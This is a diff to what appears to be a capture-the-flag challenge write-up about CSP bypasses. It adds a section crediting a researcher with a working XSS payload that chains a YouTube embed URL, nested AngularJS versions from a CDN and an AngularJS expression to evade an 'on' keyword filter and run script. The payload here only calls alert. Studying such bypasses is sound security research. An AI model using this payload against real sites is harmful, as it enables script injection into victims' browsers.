@@ -676,6 +676,22 @@ PoC:
 
 I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain.
 
+## Another bypass with AngularJS only
+
+[@kinugawamasato](https://twitter.com/kinugawamasato/status/1565146690470162432) found another very coll way for the CSP bypass without any other library, here is the payload:
+
+```
+https://www.youtube.com/embed/srcdoc=
+<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
+<iframe/ng-app/ng-csp/srcdoc="
+  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
+  </script>
+  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
+></iframe>.jpg
+```
+
+It uses nested AngularJS expression to bypass `on` keyword, and also use `$event.target.ownerDocument.defaultView` to access window, brilliant!
+
 ## Credits
 
 Bruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge.
